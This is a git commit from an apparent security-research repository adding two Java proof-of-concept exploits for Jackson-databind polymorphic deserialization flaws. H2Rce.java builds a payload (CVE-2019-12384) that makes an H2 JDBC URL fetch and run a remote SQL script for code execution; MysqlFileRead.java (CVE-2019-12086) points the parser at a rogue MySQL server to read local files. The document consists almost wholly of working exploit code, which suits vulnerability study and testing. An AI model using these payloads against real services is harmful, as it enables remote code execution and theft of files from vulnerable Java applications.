8713752be4ccd5d277581c7d60a391870a2bdf7c
xuanyh <xuanyh@dxy.cn>
2019-08-05 19:17:58 +0800

    增加jackson部分payload测试，包括mysql的文件读取、h2 db的rce、logback的jndi以及ehcache的jndi

---
+++ src/main/java/com/threedr3am/bug/jackson/H2Rce.java
@@ -0,0 +1,22 @@
+package com.threedr3am.bug.jackson;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import java.io.IOException;
+
+/**
+ * CVE-2019-12384
+ * jackson-databind RCE < 2.9.9.2
+ * @author xuanyh
+ */
+public class H2Rce {
+  public static void main(String[] args) throws IOException {
+
+    ObjectMapper objectMapper = new ObjectMapper();
+    objectMapper.enableDefaultTyping();//开启 defaultTyping
+    //TODO 把resources文件inject.sql放到http服务器
+    String json = "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", " +
+        "{\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:80/inject.sql'\"}]";
+    Object o = objectMapper.readValue(json, Object.class);//反序列化对象
+    String s = objectMapper.writeValueAsString(o);//
+  }
+}
---
+++ src/main/java/com/threedr3am/bug/jackson/MysqlFileRead.java
@@ -0,0 +1,21 @@
+package com.threedr3am.bug.jackson;
+
+import com.fasterxml.jackson.databind.ObjectMapper;
+import java.io.IOException;
+
+/**
+ * CVE-2019-12086
+ * jackson文件读取，2.x - 2.9.9，mysql < 8.0.14
+ * https://github.com/Gifts/Rogue-MySql-Server
+ * @author xuanyh
+ */
+public class MysqlFileRead {
+
+  public static void main(String[] args) throws IOException {
+    ObjectMapper mapper = new ObjectMapper();
+    mapper.enableDefaultTyping();
+    //需要指定Rogue-MySql-Server地址
+    String json = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\", \"jdbc:mysql://127.0.0.1:3306/\"]";
+    mapper.readValue(json, Object.class);
+  }
+}
